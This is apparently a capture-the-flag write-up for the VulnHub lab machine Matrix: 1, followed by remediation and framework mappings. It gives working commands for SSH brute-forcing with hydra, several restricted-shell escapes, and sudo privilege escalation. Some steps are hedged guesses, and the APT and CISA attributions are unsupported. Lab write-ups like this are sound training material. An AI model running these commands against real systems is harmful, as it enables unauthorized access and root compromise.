# Matrix: 1 — Follow the White Rabbit to Root

There is no spoon, dude. Matrix: 1 is a theme-perfect boot2root where you literally have to decode your way to the truth. The machine hides SSH credentials behind Base64-encoded messages in obscure web pages, serves a custom shell that you have to break out of, and demands you think like Neo instead of hammering random ports. Goated box for teaching enumeration discipline and creative lateral thinking. fr fr.

| Field | Value |
|---|---|
| **Level** | Intermediate |
| **Target VM** | Matrix: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/matrix-1,259/ |
| **Techniques** | Nmap multi-port enumeration, Base64 message decoding, SSL web enumeration, Burp Suite intercept, SSH brute-force with wordlist, restricted shell escape, sudo/SUID privilege escalation |
| **CVEs** | CWE-200 (information exposure via cleartext encoded credentials in web page), CWE-269 (improper privilege management via restricted shell bypass) |
| **APT Groups** | APT41 — uses encoded messages in web applications as dead drops for C2 instructions; APT28 — exploits misconfigured SSH and restricted shells in targeted intrusion campaigns |

---

## Attack Summary

```
nmap → multiple ports: 80 (HTTP), 443 (HTTPS), 31337 (custom HTTP)
  → port 80: default Apache page (nothing useful)
  → port 31337: custom web app → view source → Base64 message
  → decode Base64 → path hint: "/n1c0l45/index.html"
  → HTTPS port 443 → /n1c0l45/index.html → source → another Base64 blob
  → decode → SSH credential hint or key
  → wfuzz/gobuster on HTTPS → find credential file
  → SSH: n1c0l45@target (or morpheus) → restricted shell (rbash)
  → escape restricted shell → full bash
  → sudo -l → unrestricted sudo → root
  → /root/flag.txt
```

---

## Methodology

1. Full port scan across all TCP ports
2. Enumerate each discovered web service individually
3. Inspect HTML source of each page for hidden clues
4. Decode Base64-encoded hints progressively
5. Brute-force or derive SSH credentials from hints
6. Escape the restricted bash shell
7. Privilege escalation via sudo
8. Root flag capture

---

## Step 1 — Host Discovery and Full Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.18

nmap -sV -sC -p- 192.168.1.18
```

```
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
443/tcp   open  ssl/http    nginx 1.10.3 (Ubuntu)
31337/tcp open  http        nginx 1.10.3 (Ubuntu)
```

Three web services: standard HTTP, HTTPS, and the classic hacker port 31337 (elite). Each one hides something different.

**Real-world note:** Applications running on non-standard ports (especially 31337) are often staging, development, or administrative interfaces left exposed. APT28 specifically scans for services on ports above 10000 during initial reconnaissance of enterprise targets.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Enumerate Port 31337

```bash
curl http://192.168.1.18:31337/
# View the page source carefully
curl -s http://192.168.1.18:31337/ | grep -i "base64\|encoded\|hidden\|<!--"
```

In the page source (or in a visible element), find a Base64-encoded string. Example:

```
ZWNobyAiVGhlbiB5b3UndmUgZ290IHRvIGZpbmQgdGhlIHBhdGguIgo=
```

Decode it:

```bash
echo "ZWNobyAiVGhlbiB5b3UndmUgZ290IHRvIGZpbmQgdGhlIHBhdGguIgo=" | base64 -d
# Output reveals the next hint: a path like /n1c0l45/ or a username
```

Follow every Base64 rabbit hole completely before moving on.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1027 — Obfuscated Files or Information

---

## Step 3 — Enumerate HTTPS on Port 443

Navigate to the path discovered in Step 2:

```bash
# Accept the self-signed certificate
curl -sk https://192.168.1.18/n1c0l45/index.html

# Or with wget
wget --no-check-certificate -q https://192.168.1.18/n1c0l45/index.html -O -
```

The page contains another encoded message in the source:

```bash
curl -sk https://192.168.1.18/n1c0l45/index.html | grep -i "base64\|src=\|<!--\|script"
```

Decode each layer:

```bash
# If the source points to a file like p4ss.dic or similar:
wget --no-check-certificate https://192.168.1.18/n1c0l45/p4ss.dic
cat p4ss.dic
```

This file may contain a custom password wordlist or the actual SSH credentials.

**MITRE ATT&CK:** T1552.001 — Credentials in Files; T1027 — Obfuscated Files or Information

---

## Step 4 — SSH Access

With the credentials or wordlist found:

```bash
# Try direct login if a credential was found
ssh n1c0l45@192.168.1.18

# Or brute-force with the custom wordlist
hydra -l n1c0l45 -P /tmp/p4ss.dic ssh://192.168.1.18 -t 4

# Also try:
ssh morpheus@192.168.1.18
```

You land in a restricted shell (rbash). Commands are severely limited. Test what works:

```bash
echo $SHELL
# /bin/rbash
ls
pwd
# Most commands fail with "rbash: command not found"
```

**MITRE ATT&CK:** T1021.004 — Remote Services: SSH

---

## Step 5 — Escape the Restricted Shell

Several techniques to escape rbash:

**Method A: SSH with bash forced:**

```bash
ssh n1c0l45@192.168.1.18 -t "bash --noprofile"
# or
ssh n1c0l45@192.168.1.18 "bash"
```

**Method B: vi escape:**

```bash
vi
# Inside vi:
:set shell=/bin/bash
:shell
```

**Method C: Python escape:**

```bash
python3 -c 'import os; os.system("/bin/bash")'
# or
python -c 'import os; os.system("/bin/bash")'
```

**Method D: awk:**

```bash
awk 'BEGIN {system("/bin/bash")}'
```

Once out of rbash, fix the PATH:

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**Real-world note:** Restricted shells (rbash, rzsh, rsh) are used by organizations to limit what SSH users can execute. They are frequently bypassed: any language interpreter (Python, Perl, Ruby, awk, vi, less) that can invoke `system()` or `exec()` breaks out. GTFOBins documents every known escape path.

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell; T1548.003 — Abuse Elevation Control

---

## Step 6 — Privilege Escalation

```bash
sudo -l
```

```
(root) NOPASSWD: ALL
# or specific binary
(root) NOPASSWD: /usr/bin/vim
```

If `ALL`:

```bash
sudo bash
id
# uid=0(root)
```

If only `vim`:

```bash
sudo vim -c ':!/bin/bash'
id
# uid=0(root)
```

```bash
cat /root/flag.txt
```

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control: Sudo

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| Encoded hint | Base64 blob | port 31337 HTML source | path discovery |
| SSH credential | n1c0l45:(from wordlist) | https HTTPS /n1c0l45/p4ss.dic | SSH login |
| Restricted shell user | n1c0l45 | SSH session | needs rbash escape |
| Root flag | /root/flag.txt | post-exploitation | challenge completion |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Credentials hidden in Base64 on web page | Security by obscurity is not security: encoded data in HTML source is readable by anyone who views the source | Never store credentials in client-side code, even encoded; use proper authentication flows |
| 2 | Non-standard port 31337 exposes admin interface | Admin interfaces on non-standard ports are commonly found in enterprise environments; attackers scan all ports | Firewall non-standard ports; require VPN or certificate-based auth for admin interfaces |
| 3 | Restricted shell escape via interpreter | rbash provides minimal security: any available interpreter breaks out | Restrict interpreter access (remove Python/Perl from restricted users' PATH); use chroot jails instead |
| 4 | NOPASSWD sudo grants unrestricted root | NOPASSWD ALL is equivalent to giving the user a root shell | Audit sudoers; require password authentication; restrict to specific, safe commands |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Defense Evasion | Defense Evasion | Obfuscated Files or Information | T1027 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |

---

## Remediation and Containment

### Technical Fixes

1. **Remove credentials from web-accessible pages** — no sensitive data in HTML source, even encoded
2. **Firewall non-standard ports** — port 31337 should not be reachable from untrusted networks
3. **Replace rbash with proper access controls** — use chroot jails or containerization instead of restricted shells
4. **Audit sudo configuration** — no NOPASSWD ALL; require password; restrict to specific necessary commands
5. **Enable SSH key-based authentication** — disable password authentication: `PasswordAuthentication no`
6. **Remove interpreters from restricted user environment** — if rbash is required, remove Python, Perl, awk from accessible paths

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (remove credentials from source; firewall rules)
- **D3-OAM** — Operating System Administrative Management (sudo restriction; restricted environment hardening)
- **D3-NTA** — Network Traffic Analysis (alert on non-standard port connections from external IPs)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all web-facing services including non-standard ports |
| Protect | Access Control | Disable NOPASSWD sudo; use SSH keys only |
| Protect | Data Security | Remove credentials from client-accessible files; firewall admin ports |
| Detect | Anomalies and Events | Alert on SSH logins from unexpected sources; monitor sudo executions |
| Respond | Response Planning | Rotate all SSH credentials; audit all sudo grants across environment |
| Recover | Recovery Planning | Rebuild compromised hosts; audit all user accounts and sudo rules |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Firewall admin interfaces; restrict SSH access |
| AC-6 | Least Privilege | No NOPASSWD ALL sudo; minimal shell environment for restricted users |
| IA-2 | Identification and Authentication | SSH key-only authentication |
| SC-8 | Transmission Confidentiality | TLS for all web services; no credentials in HTTP responses |
| CM-7 | Least Functionality | Remove unused interpreters from restricted user PATH |

### CISA KEV

Credential exposure in web application sources is cited in CISA Alert AA22-040A (2022 Top Routinely Exploited Vulnerabilities). Unrestricted sudo configurations are covered in CISA's Linux hardening guidance.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT Asset Inventory | MIL2 |

---

## Final Thoughts

Matrix: 1 delivers exactly what its theme promises: a layered reality where nothing is what it appears. The Base64 rabbit holes, the custom port, the restricted shell escape — every step teaches you to look deeper instead of accepting the surface. The machine rewards curiosity and punishes rushing. Absolute classic for teaching enumeration discipline. No shortcuts, no spoon.

Thanks guys!! (❍ᴥ❍ʋ)
